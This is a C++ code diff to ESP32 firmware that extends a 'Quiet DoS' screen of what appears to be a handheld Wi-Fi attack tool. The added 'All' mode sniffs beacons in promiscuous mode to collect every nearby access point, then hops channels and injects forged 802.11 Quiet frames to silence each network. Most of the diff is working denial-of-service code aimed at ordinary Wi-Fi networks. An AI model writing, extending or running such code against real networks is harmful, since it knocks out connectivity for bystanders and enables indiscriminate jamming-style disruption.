@@ -7,8 +7,13 @@
 #include <WiFi.h>
 
 // Quiet duration presets, in Time Units (1 TU = 1024 us). Longer = more silence.
-static const uint16_t kDur[3]      = {200, 1000, 5000};
-static const char*    kDurName[3]  = {"Short", "Medium", "Long"};
+static const uint16_t kDur[3]     = {200, 1000, 5000};
+static const char*    kDurName[3] = {"Short", "Medium", "Long"};
+
+// ── Static definitions ────────────────────────────────────────────────────
+WifiQuietDosScreen::ApEntry WifiQuietDosScreen::_allTargets[MAX_ALL] = {};
+int          WifiQuietDosScreen::_allCount = 0;
+portMUX_TYPE WifiQuietDosScreen::_allLock  = portMUX_INITIALIZER_UNLOCKED;
 
 WifiQuietDosScreen::~WifiQuietDosScreen()
 {
@@ -17,6 +22,7 @@ WifiQuietDosScreen::~WifiQuietDosScreen()
 
 void WifiQuietDosScreen::configureFromChannel(uint8_t channel, const uint8_t* bssid, const char* ssid)
 {
+  _mode = MODE_TARGET;
   _fromContext = true;
   if (bssid) {
     memcpy(_target.bssid, bssid, 6);
@@ -39,9 +45,17 @@ void WifiQuietDosScreen::onItemSelected(uint8_t index)
 {
   if (_state == STATE_MAIN) {
     _mainSel = index;
-    if (index == 0) _selectWifi();
-    else if (index == 1) { _durIdx = (uint8_t)((_durIdx + 1) % 3); _showMain(); }
-    else if (index == 2) _startAttack();
+    if (index == 0) {
+      _mode = (_mode == MODE_TARGET) ? MODE_ALL : MODE_TARGET;
+      _showMain();
+    } else if (_mode == MODE_TARGET) {
+      if (index == 1) _selectWifi();
+      else if (index == 2) { _durIdx = (uint8_t)((_durIdx + 1) % 3); _showMain(); }
+      else if (index == 3) _startAttack();
+    } else {  // MODE_ALL
+      if (index == 1) { _durIdx = (uint8_t)((_durIdx + 1) % 3); _showMain(); }
+      else if (index == 2) _startAttack();
+    }
   } else if (_state == STATE_SELECT_WIFI) {
     if (index == 0) { _selectWifi(true); return; }
     const int scanIndex = (int)index - 1;
@@ -64,20 +78,24 @@ void WifiQuietDosScreen::onUpdate()
     if (dir == INavigation::DIR_BACK || dir == INavigation::DIR_PRESS) { _stopAttack(); return; }
   }
 
-  if (_attacker) {
+  _statusTitle = "Quiet DoS";
+  if (_mode == MODE_ALL) {
+    _quietAll();
+    _statusDetail = (_allCount == 0) ? String("Scanning...") : (String(_allCount) + " APs");
+  } else if (_attacker) {
     _attacker->quiet(_target.bssid, _target.ssid.c_str(), _target.channel, 2, 1, kDur[_durIdx], 0);
-    _statusTitle  = "Quiet DoS";
     _statusDetail = _target.ssid;
   }
+
   render();
   delay(100);
 }
 
 void WifiQuietDosScreen::onBack()
 {
-  if (_state == STATE_SELECT_WIFI)      _showMain();
-  else if (_state == STATE_RUNNING)     _stopAttack();
-  else                                  Screen.goBack();
+  if (_state == STATE_SELECT_WIFI)  _showMain();
+  else if (_state == STATE_RUNNING) _stopAttack();
+  else                              Screen.goBack();
 }
 
 void WifiQuietDosScreen::onRender()
@@ -89,13 +107,25 @@ void WifiQuietDosScreen::onRender()
 void WifiQuietDosScreen::_showMain()
 {
   _state = STATE_MAIN;
-  _targetSub = _target.ssid;
-  _durSub    = String(kDurName[_durIdx]) + " (" + String(kDur[_durIdx]) + " TU)";
-  _mainItems[0] = {"Access Point", _targetSub.c_str()};
-  _mainItems[1] = {"Duration",     _durSub.c_str()};
-  _mainItems[2] = {"Start"};
-  if (_mainSel >= 3) _mainSel = 0;
-  setItems(_mainItems, 3, _mainSel);
+  _modeSub = (_mode == MODE_TARGET) ? "Target" : "All";
+  _durSub  = String(kDurName[_durIdx]) + " (" + String(kDur[_durIdx]) + " TU)";
+  _mainItems[0] = {"Mode", _modeSub.c_str()};
+
+  uint8_t itemCount;
+  if (_mode == MODE_TARGET) {
+    _targetSub = _target.ssid;
+    _mainItems[1] = {"Access Point", _targetSub.c_str()};
+    _mainItems[2] = {"Duration", _durSub.c_str()};
+    _mainItems[3] = {"Start"};
+    itemCount = 4;
+  } else {
+    _mainItems[1] = {"Duration", _durSub.c_str()};
+    _mainItems[2] = {"Start"};
+    itemCount = 3;
+  }
+
+  if (_mainSel >= itemCount) _mainSel = 0;
+  setItems(_mainItems, itemCount, _mainSel);
 }
 
 void WifiQuietDosScreen::_showScanResults()
@@ -139,28 +169,98 @@ void WifiQuietDosScreen::_selectWifi(bool forceScan)
 
 void WifiQuietDosScreen::_startAttack()
 {
-  const uint8_t blank[6] = {0, 0, 0, 0, 0, 0};
-  if (_target.ssid == "-" && memcmp(_target.bssid, blank, 6) == 0) {
-    ShowStatusAction::show("Access Point not set");
-    return;
+  if (_mode == MODE_TARGET) {
+    const MacAddr blank = {0, 0, 0, 0, 0, 0};
+    if (_target.ssid == "-" && memcmp(_target.bssid, blank, 6) == 0) {
+      ShowStatusAction::show("Access Point not set");
+      return;
+    }
   }
 
   _state       = STATE_RUNNING;
   _chromeDrawn = false;
   _statusTitle  = "Quiet DoS";
-  _statusDetail = _target.ssid;
-  render();
+  _statusDetail = (_mode == MODE_ALL) ? String("Scanning...") : _target.ssid;
+  render();   // paint before the blocking radio init in the ctor
 
   _attacker = new WifiAttackUtil();
+
+  if (_mode == MODE_ALL) {
+    portENTER_CRITICAL(&_allLock);
+    memset(_allTargets, 0, sizeof(_allTargets));
+    _allCount = 0;
+    portEXIT_CRITICAL(&_allLock);
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_rx_cb(&WifiQuietDosScreen::_beaconCb);
+  }
   render();
 }
 
 void WifiQuietDosScreen::_stopAttack()
 {
+  if (_mode == MODE_ALL) {
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
+    esp_wifi_set_promiscuous(false);
+  }
   if (_attacker) { delete _attacker; _attacker = nullptr; }
+  _allChanHop = 0;
+  _allCount   = 0;
   ShowStatusAction::show("Stopped", 1000);
+
   if (_fromContext) { _fromContext = false; Screen.goBack(); }
   else              _showMain();
+}
+
+void WifiQuietDosScreen::_quietAll()
+{
+  if (!_attacker) return;
+
+  ApEntry local[MAX_ALL];
+  int count;
+  portENTER_CRITICAL(&_allLock);
+  memcpy(local, _allTargets, sizeof(_allTargets));
+  count = _allCount;
+  portEXIT_CRITICAL(&_allLock);
+
+  // Broadcast Quiet beacon per AP (changes channel per AP internally).
+  for (int i = 0; i < count; i++) {
+    if (!local[i].valid) continue;
+    _attacker->quiet(local[i].bssid, "", local[i].channel, 2, 1, kDur[_durIdx], 0);
+  }
+
+  // Hop to next scan channel after injecting so _beaconCb keeps discovering.
+  _allChanHop = (_allChanHop % 13) + 1;
+  _attacker->setChannel(_allChanHop);
+}
+
+void WifiQuietDosScreen::_beaconCb(void* buf, wifi_promiscuous_pkt_type_t type)
+{
+  if (type != WIFI_PKT_MGMT || buf == nullptr) return;
+  const auto     pkt = static_cast<wifi_promiscuous_pkt_t*>(buf);
+  const uint8_t* pay = pkt->payload;
+  const size_t   len = pkt->rx_ctrl.sig_len;
+  if (len < 10) return;
+  const uint8_t fc_sub = (pay[0] >> 4) & 0x0F;
+  if (fc_sub != 8) return;  // beacon only
+  if (len < 22) return;
+  const uint8_t* bssid = pay + 16;
+  const uint8_t  ch    = pkt->rx_ctrl.channel;
+
+  portENTER_CRITICAL(&_allLock);
+  for (int i = 0; i < _allCount; i++) {
+    if (memcmp(_allTargets[i].bssid, bssid, 6) == 0) {
+      _allTargets[i].channel = ch;
+      portEXIT_CRITICAL(&_allLock);
+      return;
+    }
+  }
+  if (_allCount < MAX_ALL) {
+    memcpy(_allTargets[_allCount].bssid, bssid, 6);
+    _allTargets[_allCount].channel = ch;
+    _allTargets[_allCount].valid   = true;
+    _allCount++;
+  }
+  portEXIT_CRITICAL(&_allLock);
 }
 
 void WifiQuietDosScreen::_drawStatus(const char* titleLine, const char* detailLine)
